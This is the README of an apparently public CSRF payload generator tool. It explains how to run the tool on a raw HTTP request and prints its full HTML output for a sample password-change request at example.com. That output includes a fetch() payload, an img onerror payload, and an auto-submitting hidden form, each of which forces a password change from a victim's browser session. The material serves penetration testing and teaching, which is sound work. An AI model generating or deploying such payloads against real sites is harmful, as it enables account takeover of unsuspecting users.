# csrf-payload-generator
CSRF Payload Generator A powerful and flexible Cross-Site Request Forgery (CSRF) Payload Generator designed for security enthusiasts and penetration testers. This tool automates the generation of CSRF attack payloads based on HTTP requests.

Features
* Supports Multiple Payload Methods:
    
    - fetch: Uses the Fetch API to execute CSRF requests programmatically.
    - onerror: Leverages the onerror event of an empty image tag for CSRF execution.
    - form: Auto-submitting HTML forms for CSRF attacks.

* HTML Output:
    - Generates an easy-to-use HTML file containing all the CSRF payloads for testing.

* How It Works
    - Input: Supply a raw HTTP request 
    - Process: The tool parses the HTTP request, extracts relevant data, and generates payloads.
    - Output: Produces an HTML file containing the generated payloads for execution.

* Usage
  
  1 - Clone the repository:
  
---
  ```
git clone https://github.com/Abutalib-Zarban/csrf-payload-generator.git

```
 2 - Navigate to the directory:
  ```
cd csrf-payload-generator

```

 3 - Run the script with a  HTTP request file:

```
python3 csrf_generator.py request.txt


```

4- Select the desired CSRF payload method:

    
    1: fetch
    2: onerror
    3: form
    4: All methods
View the output in the csrf_payloads.html file.


* Requirements
    - Python 3.x: The script is written in Python and requires Python 3.x.

 
---------------------------
* Request sample :
```
  POST /user/change-password HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Cookie: sessionid=abcd1234efgh5678ijkl9012mnop3456

new_password=newpassword456
```

----------------------------
* Tool Output :

  
```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Payloads</title>
</head>
<body>
    <h1>Generated CSRF Payloads</h1>

    <h2>Fetch Payload</h2>
    <div>
        <pre>
<script>
fetch("http://www.example.com/user/change-password", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "new_password=newpassword456xyy"
});
</script>
</pre>
    </div>
    <hr>

    <h2>Onerror Payload</h2>
    <div>
        <pre>
<img src="" onerror="fetch('http://www.example.com/user/change-password', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }, body: 'new_password=newpassword456xyy'
})" style="display:none;">
</pre>
    </div>
    <hr>

    <h2>Form Payload</h2>
    <div>
        <pre>
<form action="http://www.example.com/user/change-password" method="POST" target="hidden_iframe">
    <input type="hidden" name="new_password" value="newpassword456xyy">
    <script>
        document.forms[0].submit();
    </script>
</form>
<iframe name="hidden_iframe" style="display:none;"></iframe>
</pre>
    </div>
    <hr>

</body>
</html>

```

------
* Disclaimer
This tool is intended for educational purposes and authorized security testing only. Misuse of this tool may result in legal consequences. Always obtain proper permission before conducting any tests.
 

